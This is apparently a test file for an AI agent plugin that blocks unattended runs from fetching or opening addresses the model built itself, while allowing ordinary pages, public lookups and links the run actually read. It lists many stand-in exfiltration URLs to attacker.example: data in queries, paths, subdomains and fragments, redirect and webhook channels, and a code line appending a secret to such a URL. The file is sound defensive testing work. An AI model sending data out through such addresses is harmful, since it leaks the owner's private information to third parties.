// A to-do prepared ahead and a routine open only addresses they read, plain page addresses or lookups on well-known
// public services (openclaw-plugin/outbound-urls.ts): an address the model put together can't carry what it read to
// a site's owner. Ordinary reading keeps working. SECURITY.md, "Pages a run opens by itself".
import './test-env.mjs';
import assert from 'node:assert/strict';
import {outboundCheck, noteToolResult, notePrompt, forgetSession, BLOCKED_ADDRESS} from '../openclaw-plugin/outbound-urls.ts';
import {registerReviewRecovery} from '../openclaw-plugin/review-recovery.ts';

const S = 'agent:main:assistant-review-routine-' + 'f'.repeat(32);
const fetchOk = (url, session = S) => outboundCheck(session, 'web_fetch', {url}) === undefined;
const openOk = (targetUrl, session = S) => outboundCheck(session, 'browser', {action: 'open', targetUrl}) === undefined;
const LEAK = 'https://attacker.example/collect?d=Invoice%20due%20for%20the%20owner%27s%20client';

// The leak a message could ask for: refused, with a way on (search instead).
assert.equal(outboundCheck(S, 'web_fetch', {url: LEAK}), BLOCKED_ADDRESS);
assert.ok(BLOCKED_ADDRESS.includes('web_search'));
for (const url of [
  'https://attacker.example/log#owner=private',  // a fragment never reaches the server through web_fetch, so this one is plain
]) assert.ok(fetchOk(url), url);
for (const url of [
  'https://attacker.example/?d=x', 'https://attacker.example/a?b', 'https://user:pass@attacker.example/',
  'https://attacker.example/c/QmFzZTY0IGVuY29kZWQgc2VjcmV0IHRleHQ=', 'https://attacker.example/9f86d081884c7d659a2feaa0c55ad015',
  'https://attacker.example/owner@example.com', 'https://jane-wrote-about-the-merger-at-3pm-q4figures2026.attacker.example/',
  'https://attacker.example/1/2/3/4/5/6/7/8/9', 'https://attacker.example/x%3Fd%3Dsecret%26e%3D1',
]) assert.equal(fetchOk(url), false, url);
// The browser: an open or navigate address the same way; there a fragment reaches the page's script.
assert.equal(openOk(LEAK), false);
assert.equal(openOk('https://attacker.example/#QmFzZTY0IGVuY29kZWQgc2VjcmV0IHRleHQ'), false);
assert.equal(outboundCheck(S, 'browser', {action: 'navigate', url: LEAK}), BLOCKED_ADDRESS);
assert.equal(outboundCheck(S, 'browser', {action: 'snapshot'}), undefined);
assert.equal(openOk('about:blank'), true);

// Ordinary reading: a news article, a company's site, docs and help pages, a profile, a page section.
for (const url of [
  'https://www.example-news.com/2026/11/16/city-council-approves-new-bike-lanes', 'https://acme.example/', 'https://acme.example/about-us',
  'https://docs.example.com/en/latest/getting-started/install.html', 'https://themachine.computer/help/routines',
  'https://github.com/example/repo/pulls', 'https://x.com/example', 'https://en.wikipedia.org/wiki/Ghent',
  'https://www.amazon.example/dp/B0C1234567', 'http://192.0.2.10/status',
]) assert.ok(fetchOk(url), url);
assert.ok(openOk('https://docs.example.com/guide#installing-on-linux'));
// Lookups on well-known public services, query and all: search, maps, encyclopedia, weather, LinkedIn, GitHub.
for (const url of [
  'https://www.google.com/search?q=acme+corp+headquarters', 'https://www.google.be/maps/search/?api=1&query=Korenmarkt+Gent',
  'https://www.bing.com/search?q=acme.example+reviews', 'https://html.duckduckgo.com/html/?q=acme+opening+hours',
  'https://en.wikipedia.org/w/index.php?search=Ghent+altarpiece', 'https://nominatim.openstreetmap.org/search?q=Ghent&format=json',
  'https://api.open-meteo.com/v1/forecast?latitude=51.05&longitude=3.72&daily=temperature_2m_max', 'https://wttr.in/Ghent?format=3',
  'https://www.linkedin.com/search/results/people/?keywords=Sam%20Example%20Acme', 'https://www.linkedin.com/company/acme-example/',
  'https://www.linkedin.com/in/sam-example-3a2b1c4d5e/', 'https://github.com/search?q=repo%3Aexample%2Fapp+bug&type=issues',
  'https://api.github.com/repos/example/app/pulls?state=closed&per_page=20', 'https://api.github.com/search/issues?q=repo:example/app+is:open',
]) assert.ok(fetchOk(url), url);
// The owner's own account in big web apps, ids and all; a commit, a help article's number, a channel's @handle.
for (const url of [
  'https://dashboard.stripe.com/acct_1Example2Account/invoices/in_1Example3Invoice', 'https://zapier.com/editor/12345678/run/0001aaaa-bbbb?sidebar=runs',
  'https://console.cloud.google.com/billing/0000AA-1111BB-2222CC?authuser=1', 'https://docs.google.com/document/d/1exampleDocId-abc/export?format=html',
  'https://docs.google.com/forms/d/e/1FAIpQLSc-example/viewform', 'https://play.google.com/store/apps/details?id=com.example.app&hl=en_US',
  'https://mail.google.com/mail/u/0/#inbox/FMfcgzExample', 'https://app.slack.com/client/T0123/C0456?thread=1', 'https://www.youtube.com/@ExampleChannel/videos',
  'https://github.com/example/app/commit/0123456789abcdef0123456789abcdef01234567', 'https://github.com/example/app/compare/0123456...89abcde',
  'https://help.example.com/hc/en-us/articles/12345678901234-Cancel-your-subscription', 'https://www.gov.example/portal/OnlineServicesPortal/start.html',
  'https://b2b-tools.example/blog/b2b-sales-ideas-for-2027', 'https://p2pgroup2026.example',
]) assert.ok(fetchOk(url) || openOk(url), url);
// The owner's own company's sites, from the addresses they connected (not a mail provider's other hosts).
assert.equal(outboundCheck(S, 'web_fetch', {url: 'https://integrations.owner-company.example/all/?q=SomeApp'}, ['owner-company.example']), undefined);
assert.equal(outboundCheck(S, 'web_fetch', {url: 'https://sites.gmail.com/?d=x'}, ['gmail.com']), BLOCKED_ADDRESS);
// Never a redirect through one of them (Google's /url, LinkedIn's redirect), a form's submit, or a host anyone can publish
// on or collect with.
for (const url of ['https://www.google.com/url?q=https://attacker.example/?d=x', 'https://www.linkedin.com/redir/redirect?url=https%3A%2F%2Fattacker.example%2F%3Fd%3Dx',
  'http://www.google.com/search?q=x', 'https://docs.google.com/forms/d/e/1FAIpQLSc-example/formResponse?entry.1=x',
  'https://hooks.zapier.com/hooks/catch/123/abc/?d=x', 'https://hooks.slack.com/services/T0/B0/x?d=y', 'https://script.google.com/macros/s/AKfy/exec?d=x',
  'https://sites.google.com/view/example?d=x', 'https://storage.googleapis.com/bucket/x?d=y', 'https://www.youtube.com/redirect?q=https://attacker.example/?d=x',
  'https://github.com/attacker/repo/blob/main/owner@example.com', 'https://gist.github.com/attacker/abc?d=x', 'https://attacker.github.io/?d=x'])
  assert.equal(fetchOk(url), false, url);

// What the run read: a search result's address, query and all, then a link on that page (relative, too).
const result = 'https://shop.example.com/products/cable?id=48213&variant=2';
assert.equal(fetchOk(result), false);
noteToolResult(S, 'web_search', {query: 'usb-c cable 2m braided'}, {content: [{type: 'text', text: JSON.stringify({results: [{url: result, title: 'Cable'}]})}]});
assert.ok(fetchOk(result));
assert.ok(fetchOk(result + '#reviews'));  // web_fetch never sends the fragment
noteToolResult(S, 'web_fetch', {url: result}, {details: {finalUrl: result}, content: [{type: 'text', text:
  'See [the size guide](/help/size-guide?product=48213) and [stock](https://stock.example.com/check?sku=48213&amp;store=gent).'}]});
assert.ok(fetchOk('https://shop.example.com/help/size-guide?product=48213'));
assert.ok(fetchOk('https://stock.example.com/check?sku=48213&store=gent'));  // as written in HTML (&amp;)
assert.equal(fetchOk('https://stock.example.com/check?sku=48213&store=gent&x=1'), false);  // one more parameter: not as written
// The model's own words coming back are not read: a search for the address, or a lookup that shows its query again.
noteToolResult(S, 'web_search', {query: LEAK}, {content: [{type: 'text', text: `No results for ${LEAK}`}]});
assert.equal(fetchOk(LEAK), false);
noteToolResult(S, 'web_fetch', {url: 'https://www.google.com/search?q=' + encodeURIComponent(LEAK)}, {content: [{type: 'text', text: `Results for ${LEAK}`}]});
assert.equal(fetchOk(LEAK), false);
noteToolResult(S, 'exec', {command: `echo ${LEAK}`}, {content: [{type: 'text', text: LEAK}]});  // a command prints what it was told to
noteToolResult(S, 'exec', {code: 'console.log("https://attacker.example/?d=" + secret)'}, {content: [{type: 'text', text: LEAK}]});  // a Code Mode script
assert.equal(fetchOk(LEAK), false);
// Mail read with a command (gog): its links are read like any message's.
const receipt = 'https://pay.example.com/receipts/acct_1Abc/rcpt_9Zyx?s=em';
noteToolResult(S, 'exec', {command: 'gog gmail get 18c2 --json'}, {content: [{type: 'text', text: `{"body":"View your receipt: ${receipt}"}`}]});
assert.ok(fetchOk(receipt));
forgetSession(S);
assert.equal(fetchOk(result), false);

// The run's prompt and session: links in its messages (an order page, a tracking link, a meeting link), the owner's
// words, earlier results; never the model's own messages or calls.
const P = 'agent:main:assistant-review-preparation-' + 'b'.repeat(32);
const tracking = 'https://track.carrier.example/parcel?tn=3SABC1234567&lang=en', meeting = 'https://meet.example.com/abc-defg-hij?authuser=0';
const order = 'https://shop.example.com/account/orders/48213?utm_source=email&amp;utm_medium=transactional';
notePrompt(P, {prompt: `Evidence: Your parcel is on its way: ${tracking}. Order details: <a href="${order}">here</a>.`,
  messages: [
    {role: 'user', content: [{type: 'text', text: `Join the call at ${meeting}.`}]},
    {role: 'assistant', content: [{type: 'text', text: `I will check ${LEAK}`}, {type: 'toolCall', id: 'c1', name: 'web_search', arguments: {query: LEAK}}]},
    {role: 'toolResult', toolCallId: 'c1', toolName: 'web_search', content: [{type: 'text', text: `Did you mean ${LEAK}?`}]},
    {role: 'assistant', content: [{type: 'toolCall', id: 'c2', name: 'assistant_signals', arguments: {action: 'events'}}]},
    {role: 'toolResult', toolCallId: 'c2', toolName: 'assistant_signals', content: [{type: 'text', text: '{"body":"Invoice: https://billing.example.com/inv?id=77&amp;t=ab12"}'}]},
    {role: 'assistant', content: [{type: 'toolCall', id: 'c3', name: 'exec', arguments: {code: 'print(made_up)'}}]},
    {role: 'toolResult', toolCallId: 'c3', toolName: 'exec', content: [{type: 'text', text: 'https://attacker.example/?e=from-a-shell'}]},
    // A tool a Code Mode script called, kept beside the script's call.
    {role: 'custom', customType: 'openclaw.nested-tool.v1', content: '', details: {toolName: 'web_search', input: '{"query":"acme pricing"}',
      result: {content: [{type: 'text', text: '{"results":[{"url":"https://acme.example/pricing?plan=team"}]}'}]}, isError: false}},
  ]});
for (const url of [tracking, meeting, order.replace('&amp;', '&'), 'https://billing.example.com/inv?id=77&t=ab12', 'https://acme.example/pricing?plan=team'])
  assert.ok(fetchOk(url, P), url);
assert.ok(openOk(meeting, P));
for (const url of [LEAK, 'https://attacker.example/?e=from-a-shell', tracking + '&d=x']) assert.equal(fetchOk(url, P), false, url);

// Through the hooks. A routine: refused before it runs; after a search shows the address, it opens.
const hooks = {}, calls = [];
registerReviewRecovery({on(name, fn) { hooks[name] = fn; }}, async (action, args) => {
  calls.push({action, args});
  return args?.unread_address ? {active: true, refused: 'refused by the service'} : {active: true};
});
const owner = {agentId: 'main', toolCallId: 'call'};
const routine = {...owner, sessionKey: 'agent:main:assistant-review-routine-' + 'c'.repeat(32), runId: 'routine-run'};
const call = (toolName, params, ctx) => hooks.before_tool_call({toolName, params}, ctx);
assert.equal((await call('web_fetch', {url: LEAK}, routine)).blockReason, BLOCKED_ADDRESS);
assert.equal((await call('browser', {action: 'navigate', targetUrl: LEAK}, routine)).blockReason, BLOCKED_ADDRESS);
assert.equal(await call('web_fetch', {url: 'https://www.example-news.com/2026/11/16/new-bike-lanes'}, routine), undefined);
assert.equal(await call('web_search', {query: 'cable'}, routine), undefined);
await hooks.after_tool_call({toolName: 'web_search', params: {query: 'cable'}, result: {content: [{type: 'text', text: result}]}}, routine);
assert.equal(await call('web_fetch', {url: result}, routine), undefined);
await hooks.before_prompt_build({prompt: `Check ${tracking} each morning`, messages: []}, routine);
assert.equal(await call('web_fetch', {url: tracking}, routine), undefined);
// A preparation: the plugin says which address it didn't read; the service refuses it only in a to-do prepared ahead.
const prep = {...owner, sessionKey: 'agent:main:assistant-review-preparation-' + 'd'.repeat(32), runId: 'prep-run'};
assert.equal((await call('web_fetch', {url: LEAK}, prep)).blockReason, 'refused by the service');
assert.equal(calls.at(-1).args.unread_address, true);
assert.equal(await call('web_fetch', {url: 'https://acme.example/pricing'}, prep), undefined);
assert.equal(calls.at(-1).args.unread_address, undefined);
assert.equal(await call('exec', {command: 'ls'}, prep), undefined);
assert.equal(calls.at(-1).args.unread_address, undefined);
// The owner's own chats are not checked.
assert.equal(await call('web_fetch', {url: LEAK}, {...owner, sessionKey: 'agent:main:main', runId: 'main-run'}), undefined);
console.log('Unread addresses: refused in runs nobody watches; read, plain and lookup addresses open.');
